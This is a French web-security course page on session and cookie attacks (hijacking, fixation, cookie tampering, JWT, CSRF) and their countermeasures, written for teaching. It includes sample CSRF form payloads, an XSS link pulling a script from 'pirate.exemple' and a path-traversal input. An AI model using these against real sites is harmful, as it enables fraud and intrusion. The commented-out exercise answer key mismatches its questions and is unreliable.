+++
title = 'Attaques sur sessions et cookies'
weight = '730'
draft = false
+++
---------

Au chapitre 5, nous avons vu que voler un identifiant de session permet de se faire passer pour l'utilisateur. Voici les principales attaques et leurs contre-mesures.

## Principales attaques sur les sessions
### Vol de session (*session hijacking*)
 
Un attaquant peut obtenir un identifiant de session valide de plusieurs façons :
 
| Méthode | Description | Contre-mesures |
|---|---|---|
| **Écoute du réseau** | Si le site utilise HTTP sans chiffrement, le cookie circule **en clair** et peut être intercepté (Wi-Fi public, réseau compromis). | **HTTPS partout** (chapitre 4), attribut **`Secure`** |
| **XSS** | Un script injecté lit `document.cookie` (section précédente). | **`HttpOnly`** |
| **Logiciel malveillant** | Un *infostealer* sur le poste de la victime copie les cookies stockés par le navigateur (chapitre 6). | Protection du poste, sessions de courte durée, détection d'anomalies |
| **Fuite dans l'URL** | Un identifiant placé dans l'URL (`?sessionid=...`) se retrouve dans l'historique, et les journaux| Ne **jamais** placer d'identifiant de session dans l'URL |
 
<!-- {{%notice style="info" title="HTTPS et l'en-tête HSTS"%}}
Même si un site offre HTTPS, la toute première connexion d'un utilisateur se fait souvent en HTTP (par exemple lorsqu'il tape `exemple.com` sans préciser `https://`). Un attaquant en position d'**homme du milieu** peut alors empêcher la redirection vers HTTPS (attaque dite de *SSL stripping*).
 
L'en-tête **HSTS** (*HTTP Strict Transport Security*) indique au navigateur de **toujours** utiliser HTTPS pour ce site pendant une durée donnée :
 
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
 
On complète ainsi la protection offerte par TLS et les certificats étudiés au chapitre 4.
{{%/notice%}} -->
 
### Prédiction de l'identifiant de session
 
Si les identifiants de session sont **prévisibles** (par exemple, un compteur incrémenté : `session=1001`, `session=1002`...), un attaquant peut simplement **deviner** l'identifiant d'une autre personne.
 
Un identifiant de session doit donc être :
 
- **long** ;
- **généré pseudo-aléatoirement** ;
- **sans signification** : il ne doit contenir ni le nom d'utilisateur, ni la date, ni aucune information devinable.
<!-- {{%notice style="tip" title=" "%}}
En pratique, il ne faut **pas inventer son propre mécanisme de session** : les cadriciels (*frameworks*) Web modernes (Django, Express...) fournissent des mécanismes de session.
{{%/notice%}} -->
 
### Fixation de session
 
Dans une attaque par **fixation de session**, l'attaquant ne vole pas l'identifiant : il **impose** à la victime un identifiant qu'il connaît déjà.
 
**Exemple :** 
1. L'attaquant obtient un identifiant de session valide (non authentifié) : `ABC123`.
2. Il amène la victime à utiliser cet identifiant (lien piégé, poste partagé...).
3. La victime se connecte : le serveur associe son compte à la session `ABC123`.
4. L'attaquant utilise `ABC123` : il est connecté avec le compte de la victime.

 
**Contre-mesure** : **régénérer l'identifiant de session** après chaque authentification réussie (et après tout changement de privilèges). L'ancien identifiant devient alors inutile.
 
<!-- ```php
// ✅ Après une authentification réussie
session_regenerate_id(true);
``` -->
 
### Manipulation de cookies (*cookie tampering*)
 
Certaines applications mal conçues stockent dans un cookie des **informations sur lesquelles reposent des décisions de sécurité** :
 
```yaml
Set-Cookie: utilisateur=alice; role=etudiant
```
 
Puisque le cookie est stocké dans le navigateur, l'utilisateur peut le modifier (onglet *Application* des outils de développement) :
 
```yaml
Cookie: utilisateur=alice; role=enseignant
```
 
Si le serveur fait confiance à cette valeur, l'utilisateur obtient les privilèges d'un enseignant : c'est une **escalade de privilèges** (chapitre 5), et un défaut de **contrôle d'accès**.
 
**Contre-mesures** :
 
- conserver les informations sensibles (rôle, permissions) **côté serveur**, dans la session ; le cookie ne contient qu'un identifiant opaque ;
- si des données doivent être stockées côté client, les **signer** afin de détecter toute modification.

<!-- 
{{%notice style="info" title="Lien avec le chapitre 4 : intégrité et signature"%}}
Signer un cookie consiste à lui ajouter une valeur calculée à partir de son contenu et d'une **clé secrète connue uniquement du serveur**.
 
```text
role=etudiant | signature=HMAC(clé_secrète, "role=etudiant")
```
 
Si l'utilisateur modifie `role=etudiant` en `role=enseignant`, il ne peut pas recalculer la signature sans la clé secrète : le serveur détecte la modification.
 
On retrouve l'objectif d'**intégrité** étudié avec les fonctions de hachage et les signatures numériques. Attention : comme vu au chapitre 4, **signer ne chiffre pas**. Le contenu du cookie signé reste lisible par l'utilisateur. 
{{%/notice%}}
-->
 
### Jetons JWT
 
Au chapitre 5, nous avons vu que les API utilisent souvent des **jetons d'accès**. Un format très répandu est le **JWT** (*JSON Web Token*), composé de trois parties séparées par des points :

![Structure d'un jeton JWT](/images/07-jwt.png)
 
L'en-tête et le contenu sont simplement **encodés en Base64URL**, et non chiffrés. Le contenu ci-dessus se décode ainsi :
 
```json
{"sub": "alice", "role": "etudiant"}
```
 
La **signature** (chapitre 4) permet au serveur de vérifier que le jeton n'a pas été modifié.
 
<!-- {{%notice style="warning" title="Erreurs fréquentes avec les JWT"%}}
- **Croire qu'un JWT est chiffré** : n'importe qui peut lire son contenu. On n'y place jamais d'information confidentielle.
- **Ne pas vérifier la signature**, ou accepter l'algorithme `none` (jeton sans signature) : l'attaquant peut alors modifier librement le contenu.
- **Utiliser une clé secrète faible** : une clé HMAC devinable peut être trouvée par force brute hors ligne (chapitre 5), ce qui permet de forger des jetons valides.
- **Durée de vie trop longue** : un JWT est difficile à révoquer avant son expiration. On privilégie des jetons de courte durée (chapitre 5 — expiration et révocation).
- **Stockage dans `localStorage`** : un jeton accessible au JavaScript peut être volé par un XSS, contrairement à un cookie `HttpOnly`.
{{%/notice%}} -->



<!-- | Attaque | Principe | Contre-mesures |
|---|---|---|
| **Vol de session** | L'attaquant obtient le cookie : écoute réseau sans HTTPS, XSS, logiciel malveillant (chapitre 6). Aucun mot de passe nécessaire, et la **MFA est contournée**, puisque le cookie est obtenu *après* l'authentification. | HTTPS partout (chapitre 4), `Secure`, `HttpOnly`, expiration courte |
| **Identifiant prévisible** | L'identifiant est devinable (`session=1001`, `1002`...). | Identifiant long et **aléatoire**.|
| **Manipulation de cookie** | Le cookie contient une information de sécurité (`role=etudiant`) que l'utilisateur modifie (`role=admin`) : **escalade de privilèges**. | Garder les rôles **côté serveur** ; sinon **signer** le cookie | -->

<!-- 
| **Fixation de session** | L'attaquant impose à la victime un identifiant qu'il connaît, puis attend qu'elle se connecte. | **Régénérer l'identifiant** après la connexion |



{{%notice style="info" title="Lien avec le chapitre 4 : signer pour garantir l'intégrité"%}}
Pour stocker des données côté client sans qu'elles soient modifiées, le serveur les **signe** avec une clé secrète. Toute modification est détectée.
C'est le principe des **jetons JWT** utilisés par les API (chapitre 5) : un contenu lisible + une signature. Rappel du chapitre 4 : **signer ≠ chiffrer**. Le contenu d'un JWT est simplement encodé en Base64 et lisible par tous ; on n'y met donc jamais d'information confidentielle.
{{%/notice%}}
 -->
<!-- {{%notice style="info" title="HTTPS et HSTS"%}}
L'en-tête `Strict-Transport-Security` (**HSTS**) oblige le navigateur à toujours utiliser HTTPS pour un site, même si l'utilisateur tape `http://`. Il empêche un attaquant en position d'homme du milieu de forcer une connexion non chiffrée.
{{%/notice%}} -->

## Cross-Site Request Forgery (CSRF / XSRF)

Une attaque **CSRF** amène le navigateur d'une victime **connectée** à envoyer, à son insu, une requête vers le site visé. Comme le navigateur **joint automatiquement le cookie de session**, le site croit que la requête est légitime. L'attaquant ne vole rien : il **fait agir la victime à sa place**.

### Exemple

La victime est connectée à sa banque. L'attaquant l'attire sur sa propre page, qui contient :

```html
<form id="piege" action="https://banque.exemple/virement" method="POST">
  <input type="hidden" name="destinataire" value="compte-attaquant">
  <input type="hidden" name="montant" value="1000">
</form>
<script>document.getElementById("piege").submit();</script>
```

![Attaque CSRF : la victime connectée à sa banque visite une page piégée, qui envoie automatiquement un virement ; le navigateur joint le cookie de session de la banque](/images/07-csrf.png)

Le formulaire est envoyé automatiquement, le navigateur joint le cookie de la banque, et le virement est effectué. Si l'action est possible par une requête `GET`, une simple image suffit :

```html
<img src="https://banque.exemple/virement?destinataire=compte-attaquant&montant=1000">
```

### Vidéo explicative
{{<youtube xsnBRYZnBUc>}}

### Contre-mesures

1. **Jeton anti-CSRF** : une valeur aléatoire et secrète, liée à la session, est ajoutée à chaque formulaire et vérifiée par le serveur. L'attaquant ne peut pas la connaître (politique de même origine). Les cadriciels l'offrent généralement par défaut.
2. **Attribut `SameSite`** sur le cookie de session.
3. **Jamais d'action avec `GET`** : `GET` sert à consulter, `POST` à modifier.
4. **Réauthentification** pour les actions critiques (mot de passe actuel, MFA).

| | **XSS** | **CSRF** |
|---|---|---|
| D'où vient l'attaque ? | Du code s'exécute **dans le site visé** | La requête vient **d'un autre site** |
| Le site fait trop confiance... | aux **données** de l'utilisateur | au **navigateur** (le cookie suffit) |
| L'attaquant lit la réponse ? | Oui | Non |
| Contre-mesures | Encodage, `HttpOnly` | Jeton anti-CSRF, `SameSite` |

{{%notice style="tip" title="Exercice"%}}
Identifiez l'attaque : **XSS réfléchi**, **XSS stocké**, **CSRF**, **fixation de session** ou **manipulation de cookie**.

1. Un étudiant modifie le cookie `admin=false` en `admin=true` et accède au panneau d'administration.
2. Un courriel contient le lien `https://boutique.exemple/recherche?q=<script src=//pirate.exemple/x.js></script>`.
3. En visitant un blogue, l'adresse courriel d'un utilisateur est modifiée à son insu sur un réseau social où il est connecté.
4. Un attaquant envoie le lien `https://site.exemple/login?PHPSESSID=abc123`, puis utilise `abc123` après que la victime s'est connectée.
{{%/notice%}}

<!-- {{% expand "Solution" %}}
1. Manipulation de cookie
2. XSS stocké
3. XSS réfléchi
4. CSRF
5. Fixation de session
{{% /expand %}} -->


{{%notice style="tip" title="Pour aller plus loin: d'autres attaques courantes"%}}
Voici d'autres attaques courantes liées aux sessions : 
- **Contrôle d'accès défaillant (IDOR)** : l'application vérifie que l'utilisateur est **connecté**, mais pas qu'il a **le droit** d'accéder à la ressource. Ex. : changer `bulletin?etudiant=2024123` en `2024124` affiche le bulletin d'un autre étudiant. 
  
  On retrouve la distinction **authentification / autorisation** du chapitre 5 ; la solution est de vérifier les permissions **côté serveur, à chaque requête** (RBAC). C'est le **1er risque** du Top 10 de l'OWASP.
<!-- - **Traversée de répertoires** : `telecharger?fichier=../../etc/passwd` permet de lire des fichiers hors du dossier prévu. -->
- **Téléversement non contrôlé** : une « photo de profil » qui est en réalité un script exécuté par le serveur.
- **Détournement de clic** (*clickjacking*) : le site légitime est affiché dans un cadre invisible, sous un bouton piégé.

Ces attaques sont mentionnées pour les personnes désirant approfondir et aller plus loin. Il n'est pas demandé de les connaître pour les examens de ce cours.
{{%/notice%}}